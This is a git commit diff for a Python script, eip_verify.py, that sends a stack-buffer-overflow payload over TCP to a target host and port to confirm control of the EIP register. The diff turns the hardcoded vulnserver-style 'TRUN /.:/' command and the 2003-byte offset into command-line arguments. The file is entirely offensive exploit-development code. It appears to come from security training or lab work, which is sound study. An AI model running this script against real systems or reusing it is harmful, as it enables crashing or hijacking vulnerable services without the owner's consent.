2519cfce71a870c663809c8e4f34640caed0e9bb
rootshooter <75587096+rootshooter@users.noreply.github.com>
2020-12-11 06:28:32 +0000

    Update eip_verify.py

--- eip_verify.py
+++ eip_verify.py
@@ -1,35 +1,37 @@
 #!/usr/bin/python
 import optparse, sys, socket
 
-parser = optparse.OptionParser('Example: python eip_finder.py -t <target host> -p <target port>')
+parser = optparse.OptionParser('Example: python eip_finder.py -t <target host> -p <target port> -c <command> -o <offset>')
 parser.add_option('-t', dest='target', type='string', help='Enter a target host')
 parser.add_option('-p', dest='port', type='int', help='Enter a target port')
+parser.add_option('-c', dest='command', type='string', help='Enter a command')
+parser.add_option('-o', dest='offset', type='int', help='Enter a target offset')
 (options, args) = parser.parse_args()
 target = options.target
 port = options.port
+command = options.command
+offset = options.offset
 
 if (target == None) | (port == None):
 	print(parser.usage)
 	exit(0)
 
 print('\n----------------------------------EIP VERIFY------------------------------------')
-print('                            EIP Offset Verification')
-print('                             Author: @rootshooter')
+print('                              Author: @rootshooter')
 print('                                 Version: 1.0')
 print('--------------------------------------------------------------------------------')
 
 
-command = 'TRUN /.:/'
-payload = 'A' * 2003 + 'B' * 4 #CHANGE OFFSET AS NEEDED
+payload = "A" * offset + "B" * 4 
 
 try:
-	print('[+] Sending Payload')
+	print("[+] Sending Payload")
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect((target , port))
 	s.send((command + payload))
 	s.close()
-	print('[+] Payload Sent')
-	print('[+] Check debugger')
+	print("[+] Payload Sent")
+	print("[+] Check debugger\n")
 except:
-	print('[-] ERROR: Check the debugger')
+	print("[-] ERROR: Check the debugger")
 	sys.exit()
